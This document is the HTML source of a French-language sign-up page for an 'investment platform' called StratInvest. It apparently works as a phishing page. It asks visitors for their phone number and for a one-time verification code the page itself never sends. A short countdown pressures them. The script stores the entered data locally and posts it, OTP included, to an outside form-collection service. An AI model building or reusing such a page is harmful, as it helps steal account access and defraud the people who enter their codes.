<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>StratInvest - Inscription</title>
  <link rel="stylesheet" href="style.css" />
  <script src="https://www.google.com/recaptcha/api.js" async defer></script>
</head>
<body>
  <header>
    <h1>Bienvenue sur StratInvest</h1>
    <p>Plateforme stratégique d’investissement</p>
  </header>

  <section>
    <form action="https://formspree.io/f/xeoznbrz" method="POST">
      <label for="phone">Numéro de téléphone</label>
      <input type="tel" name="phone" id="phone" placeholder="Votre numéro de téléphone" required />
      <label for="pseudo">Nom d'utilisateur</label>
      <input type="text" name="pseudo" id="pseudo" placeholder="Votre pseudo" required />

      <label for="email">Adresse Email</label>
      <input type="email" name="email" id="email" placeholder="Votre email" required />

      <label for="otp">Code de Vérification (OTP)</label>
      <input type="text" name="otp" id="otp" placeholder="Code de Vérification" required />
      <span class="timer">6s</span>

      <!-- reCAPTCHA invisible -->
      <div class="g-recaptcha"
           data-sitekey="6Lc2C6UrAAAAAOFxl7qaGtgUwf3GNvbT2-_Hy-fm"
           data-size="invisible"
           data-callback="onSubmit">
      </div>

      <button type="submit">S'inscrire Maintenant</button>
      <p>Vous n'avez pas de compte ? <a href="#">Se Connecter</a></p>
    </form>
  </section>

  <footer>
    <p>Contact : <a href="mailto:stratinvest01@gmail.com">stratinvest01@gmail.com</a></p>
    <p>© 2025 StratInvest. Tous droits réservés.</p>
  </footer>

  <script>
    const form = document.querySelector("form");

    form.addEventListener("submit", function(e) {
      e.preventDefault();
      const pseudo = document.querySelector("input[name='pseudo']").value;
      const email = document.querySelector("input[name='email']").value;
      const otp = document.querySelector("input[name='otp']").value;

      localStorage.setItem("stratPseudo", pseudo);
      localStorage.setItem("stratEmail", email);
      localStorage.setItem("stratOtp", otp);

      grecaptcha.execute(); // lance reCAPTCHA
    });

    function onSubmit(token) {
      const formData = new FormData(form);
      fetch(form.action, {
        method: "POST",
        body: formData,
        headers: { Accept: "application/json" }
      })
      .then(response => {
        if (response.ok) {
          window.location.href = "dashboard.html"; // redirection vers dashboard
        } else {
          form.innerHTML = "<h3 style='color:#e60000;'>❌ Une erreur est survenue. Veuillez réessayer.</h3>";
        }
      })
      .catch(error => {
        form.innerHTML = "<h3 style='color:#e60000;'>❌ Erreur réseau. Vérifiez votre connexion.</h3>";
      });
    }
  </script>
</body>
</html>
